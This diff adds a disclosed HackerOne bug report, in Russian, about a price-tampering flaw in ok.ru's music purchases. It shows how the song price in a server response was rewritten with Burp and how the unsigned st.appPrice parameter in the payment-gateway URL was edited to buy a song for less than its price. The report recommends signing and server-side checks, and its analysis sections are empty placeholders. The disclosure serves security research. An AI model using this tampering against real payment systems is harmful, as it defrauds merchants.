@@ -1,0 +1,72 @@
+---
+source: hackerone
+dataset: elamaran619/hackerone_disclosed_reports
+h1_id: '78219'
+original_report_id: '78219'
+title: Покупка песни дешевле, чем она стоит.
+team_handle: ok
+created_at: '2015-07-23T19:58:28.739Z'
+disclosed_at: '2016-04-29T09:59:04.786Z'
+has_bounty: true
+visibility: full
+substate: resolved
+vote_count: 3
+tags:
+- hackerone
+---
+
+# Покупка песни дешевле, чем она стоит.
+
+## Metadata
+
+- HackerOne Report ID: 78219
+- Weakness: 
+- Program: ok
+- Disclosed At: 2016-04-29T09:59:04.786Z
+- Has Bounty: Yes
+- Visibility: full
+- Substate: resolved
+
+## Original Report
+
+Итак, часть песен в приложении можно купить. Нажимая на кнопку купить, происходит запрос к серверу (обрезано, для удобства):
+>GET /isDownloaded;jsessionid=DZSUq1yT_UMNFNcYk5-mZ10DGJbUCoNYFHRUcNNwINHoSrDkkkf4gInosiPimoqGaysNvWs7GV7fnOMGgfsbCA.hHaqWq9PyS8b9PmEoYf_cA?tid=90920917758231
+
+В ответ получаем:
+>{"title":"Ð¨Ð°ÑÐµÑÐµÐ·Ð°Ð´Ð°","trackId":90920917758231,"price":10,"copyrightOwnerName":"Digital Project","isBought":false,"copyrightOwnerId":22,"image":null,"artist":"ÐÐ°ÑÐ°Ð»Ð¸"}
+
+Видно что песня, ещё не куплена: "isBought":false
+И что цена у неё: "price":10
+Настроив автоматическую замену получаемого контента (в burp это довольно легко сделать, см, скриншот) меняем цену получаемую от сервера на 1. Нажимаем, "Купить". Происходит открытие платёжного гейта(запрос в бэкграунде):
+>https://paymentnew.ok.ru/dk?st.cmd=richPayment&st.reqId=-lqbcaRr5Rw-lvBTEc_nro7Ema4SvW7OY1hv-5Ce_LFQdsbKnrYg4HIxuoCH0UvKY35Q4ndQdhRXA_Z3x7ummPimUcD-g664F4cI5Wj7kEd-4vrFEIGUpnDZPtv3SJNA&st.timestamp=1437680542328&st.appName=0L_QtdGB0L3RjyDQndCw0YLQsNC70LggLSDQqNCw0YXQtdGA0LXQt9Cw0LTQsA**&st.appCode=90920917758231&st.currency=OK&st.appPrice=1&st.callback=true&st.srv=22
+
+Уязвим параметр st.appPrice, его изменение в урле никак не влияет не целостность запроса (поменяем на 2):
+> https://paymentnew.ok.ru/dk?st.cmd=richPayment&st.reqId=-lqbcaRr5Rw-lvBTEc_nro7Ema4SvW7OY1hv-5Ce_LFQdsbKnrYg4HIxuoCH0UvKY35Q4ndQdhRXA_Z3x7ummPimUcD-g664F4cI5Wj7kEd-4vrFEIGUpnDZPtv3SJNA&st.timestamp=1437680542328&st.appName=0L_QtdGB0L3RjyDQndCw0YLQsNC70LggLSDQqNCw0YXQtdGA0LXQt9Cw0LTQsA**&st.appCode=90920917758231&st.currency=OK&st.appPrice=2&st.callback=true&st.srv=22
+
+Жмём перейти к оплате - я оплачивал вебманями, но не думаю, что это имеет значения. Покупаем 2 Ок за 2 рубля - видим в нотификации "Вы получили 2 OK."  И в итоге в разделе "Музыка" в подразделе "Мои покупки" искомая песня за 2 ОК. 
+
+Что явно влияет на целостность приложения с финансовой точки зрения. Параметр st.appPrice должен:
+- входить в параметры которые используются для подписи запроса.
+- и проверяться на стороне сервера на соответствие запрошенному продукту.
+
+## Extracted Security Notes
+
+### Likely Vulnerability Class
+
+*Leave this section for future enrichment.*
+
+### Likely Root Cause
+
+*Leave this section for future enrichment.*
+
+### Potential Impact
+
+*Leave this section for future enrichment.*
+
+### Defensive Test Cases
+
+*Leave this section for future enrichment.*
+
+### Remediation Ideas
+
+*Leave this section for future enrichment.*
